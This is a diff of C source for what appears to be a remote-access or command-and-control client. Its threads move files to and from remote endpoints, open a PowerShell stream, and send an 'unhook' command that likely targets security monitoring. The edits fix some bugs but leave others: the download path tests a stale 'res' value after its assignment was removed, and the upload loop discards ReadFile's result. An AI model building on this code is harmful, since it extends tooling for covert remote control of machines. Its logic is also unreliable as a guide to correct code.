@@ -79,6 +79,7 @@ int _est_upload_thread(endpoint_id_t endpoint_id,
 	upload_stream = *stream_id_ptr;
 
 	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
 	req.msg_enum = UPLOAD;
 
 	struct upload_msg_t* upload_msg;
@@ -128,15 +129,19 @@ DWORD WINAPI thread_upload(struct upload_params_t* params) {
 		FILE_ATTRIBUTE_NORMAL,
 		NULL
 	);
+	if (file_handle == INVALID_HANDLE_VALUE) {
+		printf("Can't access file on local machine\n");
+		return -1;
+	}
 
-	LARGE_INTEGER file_len;
-	GetFileSizeEx(file_handle, &file_len);
+	int64_t file_len;
+	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);
 
 	tremont_stream_id upload_stream;
 	res = _est_upload_thread(params->endpoint_id,
 		params->remote_path,
 		params->remote_path_len,
-		file_len.QuadPart,
+		file_len,
 		&upload_stream,
 		params->ctx
 	);
@@ -150,14 +155,13 @@ DWORD WINAPI thread_upload(struct upload_params_t* params) {
 	int read_from_file = 0;
 	char temp_buf[255];
 
-	while (total_sent < file_len.QuadPart) {
-		can_read = ReadFile(file_handle,
+	while (total_sent < file_len) {
+		ReadFile(file_handle,
 			temp_buf,
 			sizeof(temp_buf),
 			&read_from_file,
 			NULL
 		);
-		/* if(can_read == false) goto FILE_ERROR; */
 		tremont_send(
 			upload_stream,
 			temp_buf,
@@ -173,7 +177,7 @@ DWORD WINAPI thread_upload(struct upload_params_t* params) {
 	return 0;
 }
 
-int _est_download_thread(endpoint_id_t endpoint_id,
+int64_t _est_download_thread(endpoint_id_t endpoint_id,
 	char* remote_path,
 	size_t remote_path_len,
 	tremont_stream_id* stream_id_ptr,
@@ -190,6 +194,7 @@ int _est_download_thread(endpoint_id_t endpoint_id,
 	download_stream = *stream_id_ptr;
 
 	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
 	req.msg_enum = DOWNLOAD;
 
 	struct download_msg_t* download_msg;
@@ -229,6 +234,19 @@ DWORD WINAPI thread_download(struct download_params_t* params) {
 			alias_buf,
 			params->endpoint_id);
 
+	int64_t file_size;
+	tremont_stream_id download_stream;
+	file_size = _est_download_thread(params->endpoint_id,
+		params->remote_path,
+		params->remote_path_len,
+		&download_stream,
+		params->ctx
+	);
+	if (file_size == -1) {
+		printf("File not found on remote machine\n");
+		return -1;
+	}
+
 	HANDLE file_handle;
 	file_handle = CreateFileA(params->local_path,
 		GENERIC_WRITE,
@@ -238,15 +256,6 @@ DWORD WINAPI thread_download(struct download_params_t* params) {
 		FILE_ATTRIBUTE_NORMAL,
 		NULL
 	);
-
-	tremont_stream_id download_stream;
-	res = _est_download_thread(params->endpoint_id,
-		params->remote_path,
-		params->remote_path_len,
-		&download_stream,
-		params->ctx
-	);
-
 	if (res == 0) {
 		printf("Not allowed to create file on local machine\n");
 		return -1;
@@ -255,14 +264,15 @@ DWORD WINAPI thread_download(struct download_params_t* params) {
 	Tremont_Nexus* nexus = params->ctx->transport_pcb->nexus;
 
 	BOOL can_read = FALSE;
-	int64_t total_size = res;
 	int64_t total_recvd = 0;
 
 	int recvd = 0;
 	int written = 0;
 	char temp_buf[255];
 
-	while (total_recvd < total_size) {
+	tremont_opts_stream(download_stream, OPT_NONBLOCK, 1, nexus);
+
+	while (total_recvd < file_size) {
 		recvd = tremont_recv(download_stream,
 			(byte*)temp_buf, sizeof(temp_buf), nexus);
 		WriteFile(file_handle, temp_buf, recvd, &written, 0);
@@ -306,6 +316,7 @@ int _est_powershell_stream(endpoint_id_t endpoint_id,
 	powershell_stream = *stream_id_ptr;
 
 	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
 	req.msg_enum = POWERSHELL;
 
 	struct powershell_msg_t* pwrsh_msg;
@@ -405,6 +416,7 @@ int _est_unhookl_thread(endpoint_id_t endpoint_id,
 	unhookl_stream = *stream_id_ptr;
 
 	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
 	req.msg_enum = UNHOOK_L;
 
 	struct unhookl_msg_t* unhookl_msg;
